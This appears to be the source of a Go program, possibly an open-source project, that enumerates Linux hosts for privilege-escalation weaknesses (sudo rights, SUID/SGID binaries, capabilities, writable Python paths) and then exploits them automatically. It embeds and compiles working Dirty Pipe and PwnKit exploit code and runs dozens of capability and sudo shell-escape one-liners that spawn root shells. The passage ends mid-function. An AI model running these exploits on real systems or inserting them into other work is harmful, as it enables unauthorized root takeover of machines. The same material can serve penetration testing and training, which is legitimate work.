package main
 
import (
    "fmt"
    "os"
    "syscall"
    "bufio"
    "strings"
    "os/exec"
    "bytes"
    "io/ioutil"
    "log"
    "errors"
    "strconv"
    "flag"
)
 
var (
     greenBg      = string([]byte{27, 91, 57, 55, 59, 52, 50, 109})
     whiteBg      = string([]byte{27, 91, 57, 48, 59, 52, 55, 109})
     yellowBg     = string([]byte{27, 91, 57, 48, 59, 52, 51, 109})
     redBg        = string([]byte{27, 91, 57, 55, 59, 52, 49, 109})
     blueBg       = string([]byte{27, 91, 57, 55, 59, 52, 52, 109})
     magentaBg    = string([]byte{27, 91, 57, 55, 59, 52, 53, 109})
     cyanBg       = string([]byte{27, 91, 57, 55, 59, 52, 54, 109})
     green        = string([]byte{27, 91, 51, 50, 109})
     white        = string([]byte{27, 91, 51, 55, 109})
     yellow       = string([]byte{27, 91, 51, 51, 109})
     red          = string([]byte{27, 91, 51, 49, 109})
     blue         = string([]byte{27, 91, 51, 52, 109})
     magenta      = string([]byte{27, 91, 51, 53, 109})
     cyan         = string([]byte{27, 91, 51, 54, 109})
     reset        = string([]byte{27, 91, 48, 109})
     disableColor = false
)

var (
    dangerous_groups = []string{"(sudo)", "(lxd)", "(docker)"}
    dangerous_sudo_perms = []string{"root", "NOPASSWD"}
    very_dangerous_sudo_perms = []string{"(ALL : ALL) ALL"}
    dangerous_capabilities = []string{"cap_setuid"}
    dangerous_bins = []string{
    "ab", "agetty", "alpine", "ar", "arj", "arp", "as", "ascii-xfr", "ash", "aspell", "atobm", "awk", "base32", "base64", "basenc", "bash", "bridge", "busybox", "bzip2", "capsh", "cat", "chmod", "choom", "chown", "chroot", "cmp", "column",
    "comm", "cp", "cpio", "cpulimit", "csh", "csplit", "csvtool", "cupsfilter", "curl", "cut", "dash", "date", "dd", "dialog", "diff", "dig", "dmsetup", "docker", "dosbox", "ed", "efax", "emacs", "env", "eqn", "expand", "expect", "file", 
    "find", "fish", "flock", "fmt", "fold", "gawk", "gcore", "gdb", "genie", "genisoimage", "gimp", "grep", "gtester", "gzip", "hd", "head", "hexdump", "highlight", "hping3", "iconv", "install", "ionice", "ip", "ispell", "jss", "join",
    "jq", "jrunscript", "ksh", "ksshell", "kubectl", "ld.so", "less", "logsave", "look", "lua", "make", "mawk", "more", "mosquitto", "msgattrib" , "msgcat", "msgconv", "msgfilter", "msgmerge", "msguniq", "multitime", "mv" , "nasm", "nawk", 
    "nice", "nl", "nm", "nmap", "node", "nohup", "od", "openssl", "openvpn", "paste", "perf", "perl", "pg", "php", "pidstat", "pr", "ptx", "python", "readelf", "restic", "rev", "rlwrap", "rsync", "run-parts", "rview", "rvim", "sash", "scanmem", 
    "sed", "setarch", "shuf", "soelim", "sort", "sqlite3", "ss", "ssh-keygen", "ssh-keyscan", "sshpass", "start-stop-daemon", "stdbuf", "strace", "strings", "sysctl", "systemctl", "tac", "tail", "taskset", "tbl", "tclsh", "tee", "tftp", "tic", 
    "time", "timeout", "troff", "ul", "unexpand", "uniq", "unshare", "unzip", "update-alternatives", "uudecode", "uuencode", "view", "vigr", "vim", "vimdiff", "vipw", "watch", "wc", "wget", "whiptail", "xargs", "xdotool", "xmodmap", "xmore",
    "xxd", "xz", "yash", "zsh", "zsoelim", "python3", "python3.8", "vim.basic",
    }
    vul_suid = []string{}
    vul_sgid = []string{}
    vul_cap = []string{}
    vul_cve = []string{}
    python_paths = []string{}
    dangerous_cap_bins = []string{"gdb", "node", "perl", "php", "python", "ruby", "rview", "rvim", "view", "vim", "vimdiff"}
    useful_sites= []string{"www.pastebin.com", "www.github.com",}

)

var (
    kernal float64 = 0
)

func colorize(colorized_string string) string {
    block_chars := []string{"╔", "═", "║", "╚", "╠"}
    for _, char := range block_chars {
        if strings.Contains(colorized_string, char) {
            colorized_string = fmt.Sprintf(strings.Replace(colorized_string, char, fmt.Sprint(cyan, char, reset), -1))
        }
    }
    return colorized_string
}

func is_readable(fileName string) bool {
    file, err := os.Open(fileName)
    if err != nil {
        return false
    }
    defer file.Close()
    return true
}

func is_writable(fileName string) bool {
    err := syscall.Access(fileName, syscall.O_RDWR)
    if err != nil {
        return false
    }
    return true
}

func is_symlink(fileName string) bool {
    fi, _ := os.Lstat(fileName)
    if fi.Mode() & os.ModeSymlink == os.ModeSymlink {
        return true
    }
    return false
}

func exists(fileName string) bool {
    _, err := os.Stat(fileName)
    if errors.Is(err, os.ErrNotExist) {
        return false
    }
    return true
}

func longer_cmd(command string) string {
    file, _ := os.CreateTemp("", "command-")
    os.Chmod(file.Name(), 0777)
    _, _ = file.Write([]byte(fmt.Sprintf(command)))
    defer file.Close()

    whoami := exec.Command("/bin/bash", file.Name())
    whoami_out := &bytes.Buffer{}
    whoami.Stdout = whoami_out
    whoami.Run()
    os.Remove(file.Name())
    return fmt.Sprintf("%s", whoami_out)
}

func spawn_shell(command string) {
    file, _ := os.CreateTemp("", "shell-")
    os.Chmod(file.Name(), 0777)
    _, _ = file.Write([]byte(fmt.Sprintf(command)))
    defer file.Close()

    args := []string{"/bin/bash", file.Name()}
    env := os.Environ()
    execErr := syscall.Exec("/bin/bash", args ,env)
    os.Remove(file.Name())
    if execErr != nil {
        panic(execErr)
    }

}

func slice_contains(slice []string, keyword string) bool {
    for _, test := range slice {
        if strings.Contains(test, keyword) {
            return true
            break
        }
    }
    return false
}

func basic_info() {
  id := exec.Command("id")
  id_out := &bytes.Buffer{}
  id.Stdout = id_out
  id.Run()
  fmt.Println(colorize("╔═════ id"))
  fmt.Println(colorize("║"))
  test := fmt.Sprintf("%s", id_out)
  for _, group := range dangerous_groups {
    test = fmt.Sprintf(strings.Replace(test, group, fmt.Sprint(redBg, group, reset), -1))
  }
  fmt.Println(colorize("╚══ "),test)

  hostname := exec.Command("hostname")
  hostname_out := &bytes.Buffer{}
  hostname.Stdout = hostname_out
  hostname.Run()
  fmt.Println(colorize("╔═════ hostname"))
  fmt.Println(colorize("║"))
  fmt.Println(colorize("╚══ "), hostname_out)
}

func test_env() {
    var vbox_vm bool
    virtualbox := longer_cmd(fmt.Sprintf(`timeout 5 grep -ri "virtualbox" /proc/ 2>/dev/null`))
    if virtualbox != "" {
        if strings.Contains(virtualbox, `VirtualBoxVM`) {
            vbox_vm = false
        }
    } else {
        vbox_vm = true
    }
    if virtualbox == "" {
        vbox_vm = false
    }
    fmt.Println(colorize("╔═════"), "is this a virtual machine?")
    fmt.Println(colorize("║"))
    if vbox_vm == true {
        fmt.Println(colorize("╚══ "), "yes (VirtualBox)")
    } else {
        fmt.Println(colorize("╚══ "), "probably not")
    }
}

func net_info() {
  ss := exec.Command("ss",  "-a",  "-p" ,"-t", "-u", "state", "established", "state", "listening")
  ss_out := &bytes.Buffer{}
  ss.Stdout = ss_out
  ss.Run()
  fmt.Println(colorize("╔═════ basic net info (ss)"))
  fmt.Println(colorize("║"))
  test := strings.Split(fmt.Sprintf("%s", ss_out), "\n")
  for _, itr := range test {
    if itr == "" {
        continue
    }
    fmt.Println(colorize("╠══"), itr)
  }
}

func net_reachable() {
    fmt.Println(colorize("╔═════"), "pinging useful sites")
    fmt.Println(colorize("║"))
    for _, host := range useful_sites {
        ping_out:= longer_cmd(fmt.Sprintf(`timeout 5 ping `+host+` -c 1`))
        if ping_out == "" {
            fmt.Println(colorize("╠══ cant reach"), host)
        } else if strings.Contains(ping_out, "100%% packet loss") {
            fmt.Println(colorize("╠══ cant reach"), host)
        } else {
            fmt.Println(colorize("╠══"), host, "can be reached")
        }
    }
}

func release() {
  uname_a := exec.Command("/usr/bin/uname", "-a")
  uname_a_out := &bytes.Buffer{}
  uname_a.Stdout = uname_a_out
  uname_a.Run()
  fmt.Println(colorize("╔═════ release"))
  fmt.Println(colorize("║"))
  fmt.Print(colorize("╠══ "), uname_a_out)
  fmt.Println(colorize("║"))

  lsb_release_a := exec.Command("lsb_release", "-a")
  lsb_release_a_out := &bytes.Buffer{}
  lsb_release_a.Stdout = lsb_release_a_out
  lsb_release_a.Run()
  test := strings.Split(fmt.Sprintf("%s", lsb_release_a_out), "\n")

  for _, list := range test {
    if list == "" {
        continue
    }
    fmt.Println(colorize("╠══ "), list)
  }

  uname_r:= exec.Command("uname", "-r")
  uname_r_out := &bytes.Buffer{}
  uname_r.Stdout = uname_r_out
  uname_r.Run()

  no_dash := strings.Split(fmt.Sprintf("%s", uname_r_out), "-")
  release := (no_dash[0])
  no_period := strings.Split(release, ".")
  processed_release := (no_period[0] + "." + no_period[1])

  fmt.Println(colorize("╠══  Kernal version: "), processed_release)
  kernal, _  = strconv.ParseFloat(processed_release, 8) 
}

func sudo_l() {
  sudo_l := exec.Command("sudo", "-l")
  sudo_l_out := &bytes.Buffer{}
  sudo_l.Stdout = sudo_l_out
  sudo_l.Run()
  fmt.Println(colorize("╔═════ sudo permsissions"))
  fmt.Println(colorize("║"))

  test2 := fmt.Sprintf("%s", sudo_l_out)

  for _, perm := range dangerous_sudo_perms {
    test2 = strings.Replace(test2, perm, fmt.Sprint(red, perm, reset), -1)
  }
  for _, perm := range very_dangerous_sudo_perms {
    test2 = strings.Replace(test2, perm, fmt.Sprint(redBg, perm, reset), -1)
  }
  for _, bin := range dangerous_bins {
    test2 = strings.Replace(test2, fmt.Sprintf(bin+"\n"), fmt.Sprint(redBg, fmt.Sprintf(bin), reset , "\n"), -1)
  }

  test3 := strings.Split(test2, "\n")
  for _, line := range test3 {
    fmt.Println(colorize("╠══ "), line)
  }
}


func suid() {
  find_suid := exec.Command("/usr/bin/find", "/", "-perm", "/4000")
  find_suid_out := &bytes.Buffer{}
  find_suid.Stdout = find_suid_out
  find_suid.Run()
  fmt.Println(colorize("╔═════ Suid"))
  fmt.Println(colorize("║"))
  suid_list := strings.Split(fmt.Sprintf("%s", find_suid_out), "\n")

  printed := false
  for _, suid := range suid_list {
    test2 := strings.Split(suid, "/")
    test3 := fmt.Sprintf(test2[len(test2)-1])

    for _, bin := range dangerous_bins {
        if test3 == bin {
            vul_suid = append(vul_suid, suid)
            fmt.Println(colorize("╠══"),redBg, suid, reset)
            printed = true
        } 
    } //end of second for loop

    if printed != true {
        fmt.Println(colorize("╠══"),suid)
    } 
    printed = false
  } // end of first for loop
}

func sgid() {
  find_sgid := exec.Command("/usr/bin/find", "/", "-perm", "/6000")
  find_sgid_out := &bytes.Buffer{}
  find_sgid.Stdout = find_sgid_out
  find_sgid.Run()
  fmt.Println(colorize("╔═════ sgid"))
  fmt.Println(colorize("║"))
  sgid_list := strings.Split(fmt.Sprintf("%s", find_sgid_out), "\n")

  printed := false
  for _, guid := range sgid_list {
    test2 := strings.Split(guid, "/")
    test3 := fmt.Sprintf(test2[len(test2)-1])

    for _, bin := range dangerous_bins {
        if test3 == bin {
            vul_sgid = append(vul_sgid, guid)
            fmt.Println(colorize("╠══"),redBg, guid, reset)
            printed = true
        } 
    } //end of second for loop

    if printed != true {
        fmt.Println(colorize("╠══"),guid)
    } 
    printed = false
  } // end of first for loop
}

func users() {
    file, _ := os.Open("/etc/passwd")
    defer file.Close()
    fmt.Println(colorize("╔═════ users"))
    fmt.Println(colorize("║"))
    scanner := bufio.NewScanner(file)

    for scanner.Scan() {
        bash := strings.Contains(scanner.Text(), "bash")
        dash := strings.Contains(scanner.Text(), "dash")
        sh := strings.Contains(scanner.Text(), "sh")
        if bash || dash || sh {
          fmt.Println(colorize("╠══"), scanner.Text())
        }
    }
    fmt.Println()
    if err := scanner.Err(); err != nil {
        fmt.Println(err)
    }
}


func capabilites() {
  getcap := exec.Command("getcap", "-r", "/")
  getcap_out := &bytes.Buffer{}
  getcap.Stdout = getcap_out
  getcap.Run()
  fmt.Println(colorize("╔═════ capabilites"))
  fmt.Println(colorize("║"))
  test := strings.Split(fmt.Sprintf("%s", getcap_out), "\n")

  vulnurable := false
  for _, cap := range test {
    if cap == "" {
        continue
    }    
    for _, bin := range dangerous_cap_bins {
        if strings.Contains(cap, bin) && strings.Contains(cap, "cap_setuid+ep") {
            cap = strings.Replace(cap, cap, fmt.Sprint(redBg, cap, reset), -1)
            vul_cap = append(vul_cap, cap)
            fmt.Println(colorize("╠══"), cap)
            vulnurable = true
        } 
    }
    if vulnurable == true {
        vulnurable = false
        continue
    }
    for _, perm := range dangerous_capabilities {
        if strings.Contains(cap, perm) {
                    cap = strings.Replace(cap, perm, fmt.Sprint(red, perm, reset), -1)
            }
    }


    fmt.Println(colorize("╠══"), cap)
  }
}

func weakpermissions() {
    checkread := []string{"/etc/shadow", "/etc/sudoers", "/root"}
    checkwrite := []string{"/etc/passwd", "/etc/shadow", "/etc/sudoers", "/root"}
    readable := []string{}
    writable := []string{}

    for _, dir := range checkwrite {
        test_w := is_writable(dir)
        if test_w == true {
            readable = append(readable, dir)
        }
    }
    for _, dir := range checkread {
        test_r := is_readable(dir)
        if test_r == true {
            writable = append(writable, dir)
        }
    }
    if len(readable) != 0 {
      fmt.Println(colorize("╔═════ Readable files and directorys"))
      fmt.Println(colorize("║"))
      fmt.Println(colorize("╚══ "), readable)
      fmt.Println()
    }
    if len(writable) != 0 {
      fmt.Println(colorize("╔═════ writable files and directorys"))
      fmt.Println(colorize("║"))
      fmt.Println(colorize("╚══ "), writable)
      fmt.Println()
    }
}


func useful_software(){
    files, err := ioutil.ReadDir("/usr/bin")
    if err != nil {
        log.Fatal(err)
    }
    fmt.Println(colorize("╔═════ useful software"))
    fmt.Println(colorize("║"))

    for _, file := range files {
        if strings.Contains(file.Name(), "python") {
            if strings.Contains(file.Name(), "config") {
                continue
            }

            fmt.Print(colorize("╠══ /usr/bin/"), file.Name(), "\n")
            python_path := fmt.Sprintf("%s", "/usr/bin/" + file.Name())
            python_paths = append(python_paths, python_path)

            } else if file.Name() == "go" {
                fmt.Print(colorize("╠══ /usr/bin/"), file.Name(), "\n")
            } else if file.Name() == "gcc" {
                fmt.Print(colorize("╠══ /usr/bin/"), file.Name(), "\n")
            } else if file.Name() == "base64" {
                fmt.Print(colorize("╠══ /usr/bin/"), file.Name(), "\n")
            } else if file.Name() == "nc" {
                fmt.Print(colorize("╠══ /usr/bin/"), file.Name(), "\n")
            } else {
                continue
            }
    }
}

func py_path_hijack() {

    if len(python_paths) != 0 {
        fmt.Println(colorize("╔═════ checking python path (library hijacking vulnerabilities)"))
        fmt.Println(colorize("║"))
        real_python_paths := []string{}

        for _, dir := range python_paths {
            test := is_symlink(dir)
            if test == false {
                real_python_paths = append(real_python_paths, dir)
            } //second if
        } // for loop

        for _, dir := range real_python_paths{
            id_out := longer_cmd(fmt.Sprintf(dir + ` -c 'import sys;print("\n".join(sys.path))'`))
            
            id_out2 := fmt.Sprintf(id_out)
            id_out3 := strings.Split(id_out2, "\n")

            for _, dir := range id_out3 {
                if dir == "" {
                    continue
                }
                if exists(dir) != true {
                    fmt.Println(colorize("╠══ "), dir, "-- does not exist")
                    continue
                }
                if is_writable(dir) == true {
                    fmt.Println(colorize("╠══ "), dir, "-- writable")
                } else {
                    fmt.Println(colorize("╠══ "), dir)
                }

                files, err := ioutil.ReadDir(dir)
                if err != nil {
                    log.Fatal(err)
                }

                for _, file := range files {
                    path := fmt.Sprintf(dir + "/" + file.Name())

                    if is_writable(path) {
                        fmt.Println(colorize("║      ╚══ "), path, "-- writable")
                    }
                }
            }
        }
    } // first if
} // func end

func dirtypipe_exploit() {
    dirtypipe_code := fmt.Sprintf(`
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

/**
 * Create a pipe where all "bufs" on the pipe_inode_info ring have the
 * PIPE_BUF_FLAG_CAN_MERGE flag set.
 */
static void prepare_pipe(int p[2])
{
    if (pipe(p)) abort();

    const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    static char buffer[4096];

    /* fill the pipe completely; each pipe_buffer will now have
       the PIPE_BUF_FLAG_CAN_MERGE flag */
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        write(p[1], buffer, n);
        r -= n;
    }

    /* drain the pipe, freeing all pipe_buffer instances (but
       leaving the flags initialized) */
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        read(p[0], buffer, n);
        r -= n;
    }

    /* the pipe is now empty, and if somebody adds a new
       pipe_buffer without initializing its "flags", the buffer
       will be mergeable */
}

int main() {
    const char *const path = "/etc/passwd";

        printf("Backing up /etc/passwd to /tmp/passwd.bak ...\n");
        FILE *f1 = fopen("/etc/passwd", "r");
        FILE *f2 = fopen("/tmp/passwd.bak", "w");

        if (f1 == NULL) {
            printf("Failed to open /etc/passwd\n");
            exit(EXIT_FAILURE);
        } else if (f2 == NULL) {
            printf("Failed to open /tmp/passwd.bak\n");
            fclose(f1);
            exit(EXIT_FAILURE);
        }

        char c;
        while ((c = fgetc(f1)) != EOF)
            fputc(c, f2);

        fclose(f1);
        fclose(f2);

    loff_t offset = 4; // after the "root"
    const char *const data = ":$6$root$xgJsQ7yaob86QFGQQYOK0UUj.tXqKn0SLwPRqCaLs19pqYr0p1euYYLqIC6Wh2NyiiZ0Y9lXJkClRiZkeB/Q.0:0:0:test:/root:/bin/sh\n"; // openssl passwd -1 -salt root piped 
        printf("Setting root password to \"piped\"...\n");
    const size_t data_size = strlen(data);

    if (offset %% PAGE_SIZE == 0) {
        fprintf(stderr, "Sorry, cannot start writing at a page boundary\n");
        return EXIT_FAILURE;
    }

    const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
    const loff_t end_offset = offset + (loff_t)data_size;
    if (end_offset > next_page) {
        fprintf(stderr, "Sorry, cannot write across a page boundary\n");
        return EXIT_FAILURE;
    }

    /* open the input file and validate the specified offset */
    const int fd = open(path, O_RDONLY); // yes, read-only! :-)
    if (fd < 0) {
        perror("open failed");
        return EXIT_FAILURE;
    }

    struct stat st;
    if (fstat(fd, &st)) {
        perror("stat failed");
        return EXIT_FAILURE;
    }

    if (offset > st.st_size) {
        fprintf(stderr, "Offset is not inside the file\n");
        return EXIT_FAILURE;
    }

    if (end_offset > st.st_size) {
        fprintf(stderr, "Sorry, cannot enlarge the file\n");
        return EXIT_FAILURE;
    }

    /* create the pipe with all flags initialized with
       PIPE_BUF_FLAG_CAN_MERGE */
    int p[2];
    prepare_pipe(p);

    /* splice one byte from before the specified offset into the
       pipe; this will add a reference to the page cache, but
       since copy_page_to_iter_pipe() does not initialize the
       "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
    --offset;
    ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
    if (nbytes < 0) {
        perror("splice failed");
        return EXIT_FAILURE;
    }
    if (nbytes == 0) {
        fprintf(stderr, "short splice\n");
        return EXIT_FAILURE;
    }

    /* the following write will not create a new pipe_buffer, but
       will instead write into the page cache, because of the
       PIPE_BUF_FLAG_CAN_MERGE flag */
    nbytes = write(p[1], data, data_size);
    if (nbytes < 0) {
        perror("write failed");
        return EXIT_FAILURE;
    }
    if ((size_t)nbytes < data_size) {
        fprintf(stderr, "short write\n");
        return EXIT_FAILURE;
    }

    char *argv[] = {"/bin/sh", "-c", "(echo piped; cat) | su - -c \""
                "echo \\\"Restoring /etc/passwd from /tmp/passwd.bak...\\\";"
                "cp /tmp/passwd.bak /etc/passwd;"
                "echo \\\"Done! Popping shell... (run commands now)\\\";"
                "/bin/sh;"
            "\" root"};
        execv("/bin/sh", argv);

        printf("system() function call seems to have failed :(\n");
    return EXIT_SUCCESS;
}

`)

    dirtypipe, err := os.Create("dirtypipe.c")
    if err != nil {
        fmt.Println("exploit file could not be created")
    }
    defer dirtypipe.Close()
    dirtypipe.WriteString(dirtypipe_code)

    longer_cmd(`gcc dirtypipe.c -o dirtypipe`)
    longer_cmd(`chmod +x dirtypipe`)
    spawn_shell(fmt.Sprintf(`./dirtypipe`))

}

func pwnkit_exploit() {

    pwnkit_file_contents := fmt.Sprintf(`
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv(void) {
}

void gconv_init(void *step)
{
    char * const args[] = { "/bin/sh", NULL };
    char * const environ[] = { "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/bin", NULL };
    setuid(0);
    setgid(0);
    execve(args[0], args, environ);
    exit(0);
}
`)

    cve_2021_4034_file_contents := fmt.Sprintf(`
#include <unistd.h>

int main(int argc, char **argv)
{
    char * const args[] = {
        NULL
    };
    char * const environ[] = {
        "pwnkit.so:.",
        "PATH=GCONV_PATH=.",
        "SHELL=/lol/i/do/not/exists",
        "CHARSET=PWNKIT",
        "GIO_USE_VFS=",
        NULL
    };
    return execve("/usr/bin/pkexec", args, environ);
}
`)
    //create and write to files
    pwnkit , err := os.Create("pwnkit.c")
    if err != nil {
        fmt.Println("exploit file could not be created")
    }
    defer pwnkit.Close()
    pwnkit.WriteString(pwnkit_file_contents)

    cve_2021_4034, err := os.Create("cve-2021-4034.c")
    if err != nil {
        fmt.Println("exploit file could not be created")
    }
    defer cve_2021_4034.Close()
    cve_2021_4034.WriteString(cve_2021_4034_file_contents)

    // build and run files
    longer_cmd(`cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c`)
    longer_cmd(`cc -Wall    cve-2021-4034.c   -o cve-2021-4034`)
    longer_cmd(`echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules`)
    longer_cmd(`mkdir -p GCONV_PATH=.`)
    longer_cmd(`cp -f /bin/true GCONV_PATH=./pwnkit.so:.`)
    fmt.Println("manual clean up required")
    spawn_shell(fmt.Sprintf(`./cve-2021-4034`))
}


func linux_exploits() {
    //dirty pipe
    if kernal >= 5.8 && kernal <= 5.17 {
        fmt.Println(colorize("      ╚══ "), redBg, "Vulnerable to CVE-2022-0847", reset, red, "(dirty pipe)", reset)
        vul_cve = append(vul_cve, "cve-2022-0847")
    }

    //pwnkit
    test := longer_cmd(fmt.Sprintf("%s", `stat -c '%%Y' $(which pkexec)`))
    test = strings.Replace(test, "\n", "", -1)
    test2, _ := strconv.Atoi(test)
    if test2 < 1642035600 {
        fmt.Println(colorize("      ╚══ "), redBg, "Vulnerable to CVE-2021-4034", reset, red, "(pwnkit)", reset)
        vul_cve = append(vul_cve, "cve-2021-4034")
    }
}

func exploit_cves() {
    if slice_contains(vul_cve, "cve-2021-4034") {
        pwnkit_exploit()
    }
    if slice_contains(vul_cve, "cve-2022-0847") {
        dirtypipe_exploit()
    }
}


func exploit_cap() {
    if slice_contains(vul_cap, "gdb") {
        gdb_cap_test := longer_cmd(fmt.Sprintf(`gdb -q -nx -ex 'python import os; os.setuid(0)' -ex '!whoami' -ex quit`))
        if gdb_cap_test == "root\n" {
            fmt.Println("got root using gdb capabilities exploit")
            spawn_shell(fmt.Sprintf(`gdb -q -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/bash' -ex quit`))
        } else if gdb_cap_test != "root\n" {
           fmt.Println("gdb capabilities exploit failed. ")
        }
    }

    if slice_contains(vul_cap, "node") {
        fmt.Println("attempting node exploit")
        spawn_shell(fmt.Sprintf(`node -e 'process.setuid(0); child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})'`))
    }

    if slice_contains(vul_cap, "perl") {
        perl_cap_test := longer_cmd(fmt.Sprintf(`perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "whoami";'`))
        if perl_cap_test == "root\n" {
            fmt.Println("got root using perl capabilities exploit")
            spawn_shell(fmt.Sprintf(`perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'`))
        } else if perl_cap_test != "root\n" {
           fmt.Println("perl capabilities exploit failed. ")
        }
    }

    if slice_contains(vul_cap, "php") {
        php_cap_test := longer_cmd(fmt.Sprintf(`php -r "posix_setuid(0); system('whoami');"`))
        if php_cap_test == "root\n" {
            fmt.Println("got root using php capabilities exploit")
            spawn_shell(fmt.Sprintf(`php -r "posix_setuid(0); system('/bin/bash');"`))
        } else if php_cap_test != "root\n" {
            fmt.Println("php capabilites exploit failed")
        }
    }

    if slice_contains(vul_cap, "python") {
        python_cap_test := longer_cmd(fmt.Sprintf(`python -c 'import os; os.setuid(0); os.system("whoami")'`))
        if python_cap_test == "root\n" {
            fmt.Println("got root using python capabilities exploit")
            spawn_shell(fmt.Sprintf(`python -c 'import os; os.setuid(0); os.system("/bin/bash")'`))
        } else if python_cap_test != "root\n" {
           fmt.Println("python capabilities exploit failed. ")
        }
    }

    if slice_contains(vul_cap, "ruby") {
        ruby_cap_test := longer_cmd(fmt.Sprintf(`ruby -e 'Process::Sys.setuid(0); exec "whoami"'`))
        if ruby_cap_test == "root\n" {
            fmt.Println("got root using ruby capabilities exploit")
            spawn_shell(fmt.Sprintf(`ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'`))
        } else if ruby_cap_test != "root\n" {
            fmt.Println("ruby capabilites exploit failed")
        }
    }

    if slice_contains(vul_cap, "rview") {
        fmt.Println("attempting rview capabilities exploit")
        fmt.Println("please note: rview must be complied with python support in order to be vulnurable")
        spawn_shell(fmt.Sprintf(`rview -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`))
    }

    if slice_contains(vul_cap, "rvim") {
        fmt.Println("attempting rvim capabilities exploit")
        fmt.Println("please note: rvim must be complied with python support in order to be vulnurable")
        spawn_shell(fmt.Sprintf(`rvim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`))
    }

    if slice_contains(vul_cap, "view") {
        fmt.Println("attempting view capabilities exploit")
        fmt.Println("please note: view must be complied with python support in order to be vulnurable")
        spawn_shell(fmt.Sprintf(`view -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`))
    }

    if slice_contains(vul_cap, "vim") {
        fmt.Println("attempting vim capabilities exploit")
        fmt.Println("please note: vim must be complied with python support in order to be vulnurable")
        spawn_shell(fmt.Sprintf(`vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`))
    }
    
    if slice_contains(vul_cap, "vimdiff") {
        fmt.Println("attempting vimdiff capabilities exploit")
        fmt.Println("please note: vimdiff must be complied with python support in order to be vulnurable")
        spawn_shell(fmt.Sprintf(`vimdiff -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`))
    }
}

func exploit_sid(vul_sid []string) {
    if slice_contains(vul_sid, "python") {
        python_suid_test := longer_cmd(fmt.Sprintf(`sudo python -c 'import os; os.system("whoami")'`))
        if python_suid_test == "root\n" {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`sudo python -c 'import os; os.execl("/bin/bash", "bash", "-p")'`))
        }  else if python_suid_test != "root\n" {
            fmt.Println("python suid exploit failed")
        }
    }

    if slice_contains(vul_sid, "agetty") {
        fmt.Println("agetty exploit: enter 'fg || fg' in event of backgrounding")
        spawn_shell(fmt.Sprintf(`sudo agetty -o -p -l /bin/bash -a root tty`))
    }

    if slice_contains(vul_sid, "bash") {
        bash_suid_test := longer_cmd(fmt.Sprintf(`sudo /bin/bash -c "whoami"`))
        if bash_suid_test == "root\n" {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`bash -p`))
        } else if bash_suid_test != "root\n" {
            fmt.Println("bash suid exploit failed")
        }
    }

    if slice_contains(vul_sid, "vim") {
        vim_suid_test := longer_cmd(fmt.Sprintf(`sudo vim -c ':!whoami'`))
        if strings.Contains(vim_suid_test,"root\n" ) {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`sudo vim -c ':!/bin/bash'`))
        } else if vim_suid_test != "root\n" {
            fmt.Println("bash suid exploit failed")
        }
    }

    if slice_contains(vul_sid, "ash") {
        ash_suid_test := longer_cmd(fmt.Sprintf(`sudo ash -c "whoami"`))
        if ash_suid_test == "root\n" {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`sudo ash`))
        } else if ash_suid_test != "root\n"{
            fmt.Println("ash exploit failed")
       }
    }  

    if slice_contains(vul_sid, "awk") {
        awk_suid_test := longer_cmd(fmt.Sprintf(`sudo awk 'BEGIN {system("whoami")}'`))
        if awk_suid_test == "root\n" {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`sudo awk 'BEGIN {system("/bin/sh")}'`))
        } else if awk_suid_test != "root\n"{
            fmt.Println("awk exploit failed")
       }
    }

    if slice_contains(vul_sid, "busybox") {
        busybox_suid_test := longer_cmd(fmt.Sprintf(`sudo busybox whoami`))
        if busybox_suid_test == "root\n" {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`sudo busybox sh`))
        } else if busybox_suid_test != "root\n"{
            fmt.Println("awk exploit failed")
       }
    }

    if slice_contains(vul_sid, "cpulimit") {
        cpulimit_suid_test := longer_cmd(fmt.Sprintf(`sudo cpulimit -l 100 -f -- whoami`))
        if strings.Contains(cpulimit_suid_test,"root\n" ) {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`sudo cpulimit -l 100 -f -- /bin/bash`))
        } else if cpulimit_suid_test != "root\n" {
            fmt.Println("cpulimit suid exploit failed")
        }
    }

    if slice_contains(vul_sid, "csh") {
        csh_suid_test := longer_cmd(fmt.Sprintf(`sudo csh -c whoami`))
        if csh_suid_test == "root\n" {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`sudo csh -b`))
        } else if csh_suid_test != "root\n"{
            fmt.Println("csh exploit failed")
       }
    }


    if slice_contains(vul_sid, "dash") {
        dash_suid_test := longer_cmd(fmt.Sprintf(`sudo dash -c whoami`))
        if dash_suid_test == "root\n" {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`sudo dash`))
        } else if dash_suid_test != "root\n"{
